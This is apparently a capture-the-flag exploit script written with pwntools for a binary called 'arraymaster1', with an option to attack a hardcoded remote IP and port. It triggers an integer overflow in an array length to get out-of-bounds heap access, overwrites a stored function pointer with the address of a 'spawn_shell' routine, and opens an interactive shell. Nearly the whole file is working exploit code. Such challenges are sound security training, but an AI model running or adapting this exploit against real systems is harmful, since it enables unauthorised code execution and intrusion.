from pwn import *
import argparse


#context.log_level = "debug"
LOCAL_PATH = "./arraymaster1"

def get_process(is_remote = False):
    if is_remote:
        return remote("35.207.132.47", 22228)
    else:
        return process(LOCAL_PATH)

def read_menu(proc):
    proc.recvuntil("\n> ")

def print_list(proc):
    read_menu(proc)
    proc.sendline("list")
    return proc.recvuntil("\nEnter the command you want to execute.", drop = True)

def init(proc, arr_id, arr_type, arr_length):
    read_menu(proc)
    proc.sendline("init {} {} {}".format(arr_id, arr_type, arr_length))
    log.info("Initializing array '{}' (Type: int{}, Length: {})".format(arr_id, arr_type, arr_length))

def set_entry(proc, arr_id, arr_index, value):
    read_menu(proc)
    proc.sendline("set {} {} {}".format(arr_id, arr_index, value))
    log.info("Setting index #{} of array '{}' to value '{}' ({})".format(arr_index, arr_id, value, hex(value)))

def get_entry(proc, arr_id, arr_index):
    read_menu(proc)
    proc.sendline("get {} {}".format(arr_id, arr_index))
    out = int(proc.recvline(keepends = False))
    log.info("Index #{} of array '{}' has value '{}' ({})".format(arr_index, arr_id, out, hex(out)))
    return out

def quit(proc):
    read_menu(proc)
    proc.sendline("quit")
    log.info("Quitting...")

parser = argparse.ArgumentParser()
parser.add_argument("-r", "--remote", help="Execute on remote server", action="store_true")
args = parser.parse_args()

e = ELF(LOCAL_PATH)

p = get_process(args.remote)

spawn_shell_addr = e.symbols["spawn_shell"]
log.info("Address of spawn_shell: {}".format(hex(spawn_shell_addr)))

init(p, "A", 64, (0xFFFFFFFFFFFFFFFF+1)/8)

init(p, "B", 64, 1)

# Entries 0, 1, 2, 3 are malloc metadata
assert(get_entry(p, "A", 4) == 1)
assert(get_entry(p, "A", 5) == 64)
# get_entry(p, "A", 6) -> pointer to actual array
assert(get_entry(p, "A", 7) == e.symbols["int64_get"])
assert(get_entry(p, "A", 8) == e.symbols["int64_set"])

set_entry(p, "A", 8, spawn_shell_addr)
set_entry(p, "B", 0, 0)

p.interactive()
